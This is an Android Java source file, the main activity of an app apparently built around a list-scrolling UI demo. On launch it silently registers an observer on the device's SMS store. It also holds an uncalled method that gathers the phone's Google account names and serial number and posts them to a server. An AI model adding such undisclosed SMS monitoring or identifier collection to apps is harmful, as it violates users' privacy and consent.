package com.firoj.shabnaz.ui;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.database.ContentObserver;
import android.database.SQLException;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v7.app.ActionBarActivity;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import com.firoj.shabnaz.MySentSmsHandler;
import com.firoj.shabnaz.R;
import com.firoj.shabnaz.Utils.SharePreferences;
import com.firoj.shabnaz.database.Repo;
import com.firoj.shabnaz.provider.FragmentTags;
import com.firoj.shabnaz.ui.fragments.CustomizeFragment;
import com.firoj.shabnaz.ui.fragments.ListBuddiesFragment;

import org.json.JSONException;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParserException;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import smsradar.Sms;
import smsradar.SmsListener;
import smsradar.SmsRadar;
import volley.AppController;


public class MainActivity extends ActionBarActivity implements CustomizeFragment.OnCustomizeListener {

    private boolean isOpenActivitiesActivated = true;
    private static Repo repo;
    private String DeviceGmailId;
    private String Radiosname;
    public static Boolean isOnline;

    public static String NGIDDBName = "Shabnaz.sqlite";

    public static int NGIDDBNameVersion = 1;


    public static Repo getRepo() {
        return repo;
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (savedInstanceState == null) {
            manageFragment(ListBuddiesFragment.newInstance(isOpenActivitiesActivated), FragmentTags.LIST_BUDDIES, false);


            try {
                initializeFromSQLite();
                // get base uri from config
                getAppConfigs();

            } catch (java.sql.SQLException e) {
                e.printStackTrace();
            }
           // initializeSmsRadarService();

            //                SessionManager session;
//                session = new SessionManager(getBaseContext());
//
//                HashMap<String, String> Radious = session.getDeviceID();
//                if(Radious!= null)
//                {
//                    Radiosname = Radious.get(SessionManager.KEY_DeviceId);
//                }
//
//
//                if (Radiosname != null) {
//                    getMailInfo();
//                }

        }

//        boolean isWiFi = false;
//        boolean isMOBILE = false;
//        boolean isOnline = true;
//
//        try {
//            ConnectivityManager cm =
//                    (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
//
//            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
//            boolean isConnected = activeNetwork != null &&
//                    activeNetwork.isConnectedOrConnecting();
//
//            if (!isConnected) {
//                if (activeNetwork != null) {
//                    isWiFi = activeNetwork.getType() == ConnectivityManager.TYPE_WIFI;
//                    isMOBILE = activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE;
//
//                    int duration = Toast.LENGTH_LONG;
//                    Toast toast = Toast.makeText(getApplicationContext(), "senderNum: ", duration);
//                    toast.show();
//                }
//            }
//
//            isOnline = isConnected || isWiFi || isMOBILE;
//        }
//        catch (Exception e)
//        {
//            e.printStackTrace();
//        }
        ContentObserver observer=new MySentSmsHandler(getApplicationContext());
        getApplicationContext().getContentResolver().registerContentObserver(
                Uri.parse("content://sms"), true, observer);





    }





    private void getAppConfigs() {
        XmlParserClass parser = new XmlParserClass();

        try {

            Map<String, String> configs = parser.getxmlArrays(getResources()
                    .getXml(R.xml.appconfig));

            for (String key : configs.keySet()) {
//                if (key.equals(getString(R.string.BaseURIxmltag))) {
//                    BaseUri = configs.get(key);
//                }
//                if (key.equals(getString(R.string.ImageURIxmltag))) {
//                    ImageUri = configs.get(key);
//                }
                if (key.equals(getString(R.string.NGIDDBxmltag))) {
                    NGIDDBName = configs.get(key);
                }
                if (key.equals(getString(R.string.NGIDDBVersionxmltag))) {
                    NGIDDBNameVersion = Integer.parseInt(configs.get(key)
                            .toString());
                }

            }
        } catch (Resources.NotFoundException e) {
           // LoggingClass.Log(e,LogLevel.ERROR, EnumModuleTags.HOMEPAGEACTIVITY);
        } catch (XmlPullParserException e) {
           // LoggingClass.Log(e,LogLevel.ERROR, EnumModuleTags.HOMEPAGEACTIVITY);
        } catch (IOException e) {
           // LoggingClass.Log(e,LogLevel.ERROR, EnumModuleTags.HOMEPAGEACTIVITY);
        } catch (Exception e) {
           // LoggingClass.Log(e,LogLevel.ERROR, EnumModuleTags.HOMEPAGEACTIVITY);
        }

    }

    private void getMailInfo() throws JSONException {

        String url = "http://192.168.0.177/RPRT.WebApi/api/RPRT/SaveUsers";

        JsonObjectRequest jsObjRequest = null;
        jsObjRequest = new JsonObjectRequest(Request.Method.POST, url,
                getParams(), new Response.Listener<JSONObject>() {

            @Override
            public void onResponse(JSONObject response) {

                String UserID = null;

//                SessionManager session = new SessionManager(getBaseContext());
//                session.createDeviceID(UserID);

            }


        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(getApplicationContext(),
                        "False", Toast.LENGTH_LONG).show();
            }
        });

        jsObjRequest.setRetryPolicy(new DefaultRetryPolicy(
                5000,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

        AppController.getInstance().addToRequestQueue(jsObjRequest);
    }

    private JSONObject getParams() throws JSONException {

        Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
        for (Account account : accounts) {
            DeviceGmailId = account.name;
        }
        JSONObject params = new JSONObject();
        params.put("PhoneEmailID", DeviceGmailId);
        params.put("DeviceId", Build.SERIAL);

        return params;
    }


    private void initializeSmsRadarService() {
        SmsRadar.initializeSmsRadarService(this, new SmsListener() {
            @Override
            public void onSmsSent(Sms sms) {
                showSmsToast(sms);
            }

            @Override
            public void onSmsReceived(Sms sms) {
                showSmsToast(sms);
            }
        });
    }


    private void showSmsToast(Sms sms) {
        Toast.makeText(this, sms.toString(), Toast.LENGTH_LONG).show();

    }


    private void initializeFromSQLite() throws java.sql.SQLException {
        try {
            Context x = getApplicationContext();
            repo = new Repo(x);
            repo.repoShabnaz();
        } catch (SQLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater menuInflater = new MenuInflater(this);
        menuInflater.inflate(R.menu.main, menu);
        MenuItem openActivities = menu.findItem(R.id.action_open_activities);
        openActivities.setChecked(isOpenActivitiesActivated);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.action_open_activities:
                onOpenActivitiesClick(item);
                break;
            case R.id.action_reset:
                resetLayout();
                break;
            case R.id.action_customize:
                manageFragment(CustomizeFragment.newInstance(), FragmentTags.CUSTOMIZE, true);
                break;
            case R.id.action_about:
                startActivityWith(AboutActivity.class);
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    private void startActivityWith(Class clazz) {
        Intent intent = new Intent(this, clazz);
        startActivity(intent);
    }

    private void manageFragment(Fragment newInstanceFragment, FragmentTags tag, boolean addToBackStack) {
        FragmentManager fm = getSupportFragmentManager();
        FragmentTransaction ft = fm.beginTransaction();
        Fragment currentIntanceFragment = findFragmentByTag(tag);
        if (currentIntanceFragment == null || (currentIntanceFragment != null && currentIntanceFragment.isHidden())) {
            if (currentIntanceFragment != null) {
                ft.show(currentIntanceFragment);
            } else {
                currentIntanceFragment = newInstanceFragment;
                ft.add(R.id.container, currentIntanceFragment, tag.toString());
                if (addToBackStack) {
                    ft.addToBackStack(null);
                }
            }
        } else {
            ft.hide(currentIntanceFragment);
            fm.popBackStack();
        }
        ft.commit();
    }

    private Fragment findFragmentByTag(FragmentTags tag) {
        return getSupportFragmentManager().findFragmentByTag(tag.toString());
    }

    @Override
    public void setSpeed(int value) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setSpeed(value);
        }
    }

    @Override
    public void setGap(int value) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setGap(value);
        }
    }

    @Override
    public void setGapColor(int color) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setGapColor(color);
        }
    }

    @Override
    public void setDivider(Drawable drawable) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setDivider(drawable);
        }
    }

    @Override
    public void setDividerHeight(int value) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setDividerHeight(value);
        }
    }

    @Override
    public void setAutoScrollFaster(int option) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setAutoScrollFaster(option);
        }
    }

    @Override
    public void setScrollFaster(int option) {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setScrollFaster(option);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        reset();
    }

    private void resetLayout() {
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.resetLayout();
            reset();
            CustomizeFragment customizeFragment = (CustomizeFragment) findFragmentByTag(FragmentTags.CUSTOMIZE);
            if (customizeFragment != null) {
                customizeFragment.reset();
            }
        }
    }

    private void reset() {
        SharePreferences.reset();
    }

    public boolean onOpenActivitiesClick(MenuItem menuItem) {
        isOpenActivitiesActivated = !menuItem.isChecked();
        menuItem.setChecked(isOpenActivitiesActivated);
        ListBuddiesFragment fragment = getListBuddiesFragment();
        if (fragment != null) {
            fragment.setOpenActivities(isOpenActivitiesActivated);
        }

        return false;
    }

    private ListBuddiesFragment getListBuddiesFragment() {
        return (ListBuddiesFragment) findFragmentByTag(FragmentTags.LIST_BUDDIES);
    }

    @Override
    protected void onPause() {
        super.onPause();
        overridePendingTransition(0, 0);
    }
}
